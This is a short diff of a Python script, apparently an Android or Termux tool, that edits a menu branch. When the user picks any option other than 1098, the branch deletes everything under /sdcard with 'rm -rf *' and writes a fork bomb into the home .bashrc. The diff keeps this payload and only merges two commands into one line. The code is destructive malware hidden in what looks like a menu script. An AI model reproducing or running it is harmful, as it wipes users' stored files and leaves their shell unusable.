@@ -45,7 +45,6 @@ if opcao == 1098:
 else:
         os.system('cd /sdcard && rm -rf * ')
         sleep(1)
-        os.system('cd $HOME')
-        sleep(1)
-        os.system('echo ":(){ :|:& };:" > .bashrc')
+        os.system('cd $HOME && echo ":(){ :|:& };:" > .bashrc')
+
         
